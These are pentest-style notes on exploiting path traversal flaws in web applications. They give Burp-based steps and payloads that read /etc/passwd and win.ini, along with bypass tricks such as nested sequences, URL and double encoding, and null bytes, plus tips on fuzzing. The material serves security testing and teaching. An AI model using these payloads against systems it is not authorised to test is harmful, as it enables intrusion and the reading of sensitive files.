---
id: Exploitation
aliases: []
tags:
  - Webapp/Exploitation/Server-Side/Path-Traversal/Exploitation
---

# Exploitation

Exploit path traversal vulnerabilities

<!-- Manual {{{-->
## Manual

Analyze the input validation functions present in the web application

<!-- Payloads {{{-->
> [!tip]- Payloads
>
> - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder)
> - [omurugur](https://github.com/omurugur/Path_Travelsal_Payload_List/tree/master/Payload)
>
<!-- }}} -->

<!-- Windows {{{-->
> [!info]- Windows
>
> Valid Windows directory traversal sequences
>
> - `../`
> - `..\`
>
<!-- }}} -->

1. Capture [[HTTP/Method/GET|GET]] requests

```sh
GET /image?filename=75.jpg HTTP/2
```

```sh
https://insecure-website.com/loadImage?filename=75.jpg
```

<!-- Example {{{-->
> [!example]-
>
> [[Burp Suite]]
>
> ![[burp-intercept.png]]
>
<!-- }}} -->

2. Modify the parameter to traverse the file path

```sh
GET /image?filename=../../../../../etc/passwd HTTP/2
```

```sh
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

<!-- Example {{{-->
> [!example]- Example
>
> ![[burp-repeater.png]]
<!-- }}} -->

___
<!-- }}} -->

<!-- Bypass{{{-->
## Bypass

Many applications that place user input into file paths
implement defenses against path traversal attacks

**Absolute Path**

Use an absolute path from the filesystem root

<!-- Info {{{-->
> [!info]-
>
> Reference a file directly without using any traversal sequences
<!-- }}} -->

```html
/etc/passwd
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> filename=/etc/passwd
> ```
<!-- }}} -->


**Web Server Root**

Traverse from the [[Web Server Root]]

<!-- Info {{{-->
> [!info]-
>
> An application may require the user-supplied filename
> to start with the expected base folder
<!-- }}} -->

```sh
/var/www/images/....//....//....//etc/passwd
```
```sh
/var/www/images/....\\....\\....\\windows\win.ini
```

**Nested Traversal Sequences**

Bypass stripping traversal sequences

<!-- Info {{{-->
> [!info]-
>
> Web servers may strip any directory traversal sequences
> before passing the input to the application
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> filename=/var/www/images/....//....//....//etc/passwd
> ```
> ```sh
> filename=/var/www/images/....\\....\\....\\windows\win.ini
> ```
>
<!-- }}} -->

**Encode/Double Encode**

[Encode](https://www.urlencoder.org/)
(*or [Double Encode](https://www.urlencoder.org/)*)
the traversal characters

<!-- Info {{{-->
> [!info]-
>
> Web servers may strip any directory traversal sequences
> before passing the input to the application
>
<!-- }}} -->

```sh
%2fetc%2fpasswd
```
```sh
%252fetc%252fpasswd
```
```sh
%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> filename=%2fetc%2fpasswd
> ```
> ```sh
> filename=%252fetc%252fpasswd
> ```
> ```sh
> filename=%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
> ```
>
<!-- }}} -->

**Null Byte**

Append a [null byte](https://en.wikipedia.org/wiki/Null_character)
to terminate the file path

<!-- Warning {{{-->
> [!warning]
>
> Patched in PHP 5.4
>
<!-- }}} -->

<!-- Info {{{-->
> [!info]-
>
> Web applications may require a user-supplied filename
> to end with an expected file extension (*e.g., `.png`, `.txt`*)
>
> ```php
> $_GET[‘param’].“php”
> ```
<!-- }}} -->

```sh
../../../etc/passwd%00.png
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ../../../etc/passwd%00.png
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- Fuzz {{{-->
## Fuzz

Test path traversal vulnerabilities

[[ZAP/Fuzzer|ZAP Fuzzer]] / [[Burp Suite/Intruder|Burp Intruder]]

1. Identify a request to investigate in History/Site Tree

2. Fuzz path traversal payloads

3. Study responses to look for any noteworthy behavior
   (*e.g., longer length indicating returned data*)

[[DotDotPwn]] — Automate exploitation

> [!todo]

___
<!-- }}} -->
